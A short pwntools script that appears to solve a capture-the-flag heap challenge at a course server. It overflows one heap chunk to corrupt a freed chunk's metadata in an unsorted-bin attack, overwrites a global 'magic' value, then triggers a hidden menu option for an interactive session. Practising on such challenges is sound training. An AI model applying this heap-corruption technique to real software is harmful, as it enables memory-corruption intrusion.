from pwn import *

r = remote("csie.ctf.tw", 10145)
# r = remote("127.0.0.1", 8888)
context.arch = "amd64"

def create(size, content):
	r.recvuntil("choice :")
	r.sendline("1")
	r.recvuntil(" : ")
	r.sendline(str(size))
	r.recvuntil(":")
	r.sendline(content)

def edit(idx, size, content):
	r.recvuntil("choice :")
	r.sendline("2")
	r.recvuntil(":")
	r.sendline(str(idx))
	r.recvuntil(" : ")
	r.sendline(str(size))
	r.recvuntil(" : ")
	r.sendline(content)

def delete(idx):
	r.recvuntil("choice :")
	r.sendline("3")
	r.recvuntil(":")
	r.sendline(str(idx))

magic = 0x601340

create(0x80, "aaaa")
create(0x80, "bbbb")
create(0x80, "cccc")
delete(1)
payload = "a" * 0x80 + flat([0, 0x91, 0, magic-0x10])
edit(0, 0x200, payload)
create(0x80, "dddd")

r.recvuntil("choice :")
r.sendline("4869")

r.interactive()

